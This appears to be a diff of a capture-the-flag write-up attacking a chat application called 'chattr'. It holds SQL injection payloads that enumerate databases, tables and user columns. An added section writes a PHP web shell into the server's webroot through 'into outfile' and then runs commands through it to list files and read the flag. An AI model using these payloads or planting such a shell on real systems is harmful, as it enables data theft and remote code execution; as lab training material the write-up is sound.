@@ -55,7 +55,7 @@ Explanation:
 
   - This exploit also allows us to create accounts with '' as the password, or with missmatched password inputs.
 
-## Exploit:
+## Formatting An SQL Injection:
 
 The "search in conversation" input field uses a GET request to retrieve data from the database. This represents a potential injection point.
 
@@ -81,6 +81,8 @@ Lets try a basic exploit to find the database name with this injection:
 <img width="1282" height="445" alt="chattr2" src="https://github.com/user-attachments/assets/705aabe0-e1bc-4fee-acdd-471273234a79" />
 
 
+## Finding The Admin Password:
+
 Now lets enumerate the databases and tables, we can do that with:
 
     ') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES-- -
@@ -89,11 +91,9 @@ Now lets enumerate the databases and tables, we can do that with:
   - Table: Users
   - Database: chattr 
 
-
 The next step is to get the column names for the "Users" table:
 
-    ') UNION SELECT 1,2,COLUMN_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="Users"# - 
-
+    ') UNION SELECT 1,2,COLUMN_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="Users"-- - 
 
 Lets inspect the "Username" and "Password"
 
@@ -134,3 +134,21 @@ Next, lets see what permissions are avalible with the payload:
 
     - The webroot is: /var/www/chattr-prod
 
+## Remote Code Execution:
+
+Given that we have write permissions, let write some malicious code on the server.
+
+    ') UNION SELECT "","",'<?php system($_REQUEST[0]); ?>',"" into outfile "/var/www/chattr-prod/fSociety.php"-- -
+
+- This will allow us to send commands through the url.
+    - For exampe lets list the files in the root directory (make sure to URL encode your command)
+    - Command: ls /
+ 
+https://154.57.164.78:32157/fSociety.php?0=ls%20/
+
+
+https://154.57.164.78:32157/fSociety.php?0=cat%20/flag_876a4c.txt
+
+
+
+- And with that, we've got the flag!
